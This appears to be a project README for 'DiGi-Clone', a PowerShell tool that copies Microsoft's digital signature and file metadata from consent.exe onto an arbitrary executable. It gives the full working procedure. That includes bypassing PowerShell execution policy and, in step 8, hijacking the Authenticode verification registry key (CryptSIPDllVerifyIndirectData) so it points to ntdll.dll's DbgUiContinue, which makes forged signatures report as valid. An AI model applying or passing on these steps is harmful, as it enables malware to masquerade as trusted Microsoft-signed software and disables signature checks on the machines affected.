# DiGi-Clone
Steps to follow:
STEP1:  Choose a sample executable of a CPP file i.e. testapp.exe 
STEP2:  Check if the file we choose is digitally signed or not by using the command 
Get-AuthenticodeSignature .\testapp.exe

Checking Metadata by using exiftool.exe

STEP3: 
Now we need a file Which is digitally signed by Microsoft , so we have chosen consent.exe from C:\Windows\System32 folder and checking for its signature 

Checking Metadata by using exiftool.exe

STEP4:
Now we bypass the PowerShell script execution policy in the system by the following command in cmd PowerShell -ep bypass




STEP5:
We have to Import our CLI Module Script which is saved in digiclone.ps1 in order to use digiclone and use its commands.
 Import-Module .\digiclone.ps1

STEP6: After importing the Ps module we have to run the following command 
  Start-DigiClone -Source .\consent.exe -Target .\testapp.exe -Sign
-Source is used for selecting the source file from which the signature and the metadata is going to be cloned.
-Target is used for selecting the file to which the signature and the metadata are going to be embedded
-Sign is the optional tag that is used to copy the signature we can run the command without it for only metadata cloning



STEP7: After running the command our cloned file is saved in the 
C:\Users\Bandit G\Desktop\crypto project\Digiclone\20221128_094234
Now go to that directory and check the signature and metadata of the cloned file 

Clearly the modified file shows the status as HashMismatch as Digiclone only copies the digital signature and cannot copy the hash of a file as the hash of every file is different.
Checking Metadata of the new file by using exiftool.exe

STEP8: As the modified file is showing hash mismatch status on verification of the digital signature we have to modify the registry key which is used to validate the digital signature of the portable executables
Windows uses the following registry key for .exe validation  {C689AAB8-8E78-11D0-8C47-00C04FC295EE} 
            Now, we need to modify the registry at the location
      HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType    0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}
            DLL to  C:\Windows\System32\ntdll.dll
            Function to DbgUiContinue

STEP9:Now open a new PowerShell for the changes to take place and verify the digital signature of the cloned file 
BEFORE

AFTER
   
